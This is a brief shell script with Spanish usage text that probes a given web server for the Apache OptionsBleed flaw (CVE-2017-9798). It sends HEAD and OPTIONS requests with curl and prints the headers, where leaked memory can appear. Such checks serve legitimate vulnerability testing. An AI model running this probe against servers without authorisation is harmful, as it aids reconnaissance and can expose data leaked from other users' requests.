#!/bin/sh
echo
echo "Vulnerabilidad OptionsBleed CVE-2017-9798 Apache Options Allow: HEAD HEAD"
echo "-------------------------------------------------------------------------"
echo 
echo "Uso.: apachebleed http://serverwebapache.com"
echo
echo "-------------------------------------------------------------------------"
curl -I -L $1
echo "-------------------------------------------------------------------------"
curl -sI -X OPTIONS $1
echo "-------------------------------------------------------------------------"
curl -D - -X OPTIONS $1
